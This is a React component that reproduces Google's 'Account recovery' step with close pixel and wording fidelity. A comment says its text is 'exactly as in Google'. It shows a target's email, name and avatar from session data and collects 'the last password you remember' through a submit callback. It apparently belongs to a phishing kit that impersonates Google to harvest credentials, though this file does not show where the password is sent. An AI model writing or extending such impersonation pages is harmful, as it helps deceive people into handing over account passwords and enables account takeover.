import React, { useState } from 'react';
import { Loader2 } from 'lucide-react';
import AccountBadge from './AccountBadge';

export default function StepLastPassword({
  sessionData,
  onSubmit,
  loading,
  error,
  onTryAnotherWay,
  onChangeAccount
}) {
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);

  const handleSubmit = (e) => {
    e.preventDefault();
    if (!password) return;
    onSubmit(password);
  };

  return (
    <div className="w-full text-left">
      {/* Title */}
      <h1 className="text-[24px] sm:text-[28px] font-normal text-[#1f1f1f] tracking-tight leading-tight">
        Account recovery
      </h1>

      {/* Account Badge Pill */}
      <AccountBadge
        email={sessionData?.email}
        fullName={sessionData?.full_name}
        avatarUrl={sessionData?.avatar_url}
        onChangeAccount={onChangeAccount}
      />

      {/* Description exactly as in Google */}
      <p className="text-[14px] sm:text-[15px] text-[#1f1f1f] mt-4 mb-8 leading-normal font-normal">
        Enter the last password you remember using with this Google Account
      </p>

      {/* Error Banner */}
      {error && (
        <div className="mb-6 flex items-start gap-2.5 p-3 rounded-[4px] bg-[#fdeded] border border-[#f5c2c7] text-[#d93025] text-[13px] leading-snug">
          <svg className="w-4 h-4 text-[#d93025] shrink-0 mt-0.5" viewBox="0 0 24 24" fill="currentColor">
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" />
          </svg>
          <span>{error}</span>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-6">
        {/* Outlined Input Field */}
        <div>
          <div className="relative">
            <input
              type={showPassword ? 'text' : 'password'}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              placeholder="Enter last password"
              required
              autoFocus
              disabled={loading}
              className={`w-full h-[56px] px-4 bg-white border ${
                error
                  ? 'border-[#d93025] focus:border-[#d93025]'
                  : 'border-[#747775] hover:border-[#1f1f1f] focus:border-[#0b57d0]'
              } focus:border-2 rounded-[4px] text-[#1f1f1f] placeholder:text-[#444746] text-[16px] outline-none transition-colors disabled:bg-[#f8f9fa] disabled:cursor-not-allowed`}
            />
          </div>
        </div>

        {/* Show Password Checkbox */}
        <div className="flex items-center gap-3 select-none pt-1">
          <input
            type="checkbox"
            id="showPasswordCheck"
            checked={showPassword}
            onChange={(e) => setShowPassword(e.target.checked)}
            disabled={loading}
            className="w-4 h-4 rounded-[2px] border-[#747775] text-[#0b57d0] focus:ring-0 cursor-pointer accent-[#0b57d0] disabled:cursor-not-allowed"
          />
          <label
            htmlFor="showPasswordCheck"
            className="text-[14px] text-[#1f1f1f] cursor-pointer"
          >
            Show password
          </label>
        </div>

        {/* Bottom Actions Row (Try another way on left, Next on right) */}
        <div className="flex items-center justify-between pt-16">
          <button
            type="button"
            onClick={onTryAnotherWay}
            disabled={loading}
            className="text-[14px] font-medium text-[#0b57d0] hover:bg-[#f0f4f9] px-3 py-2 rounded-full transition-colors -ml-3 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            Try another way
          </button>

          <button
            type="submit"
            disabled={loading || !password}
            className="inline-flex items-center justify-center gap-2 min-w-[88px] px-6 h-[40px] rounded-full bg-[#0b57d0] hover:bg-[#0842a0] text-white font-medium text-[14px] transition-colors disabled:opacity-70 disabled:cursor-not-allowed shadow-none"
          >
            {loading ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin text-white" />
                <span>Next</span>
              </>
            ) : (
              <span>Next</span>
            )}
          </button>
        </div>
      </form>
    </div>
  );
}
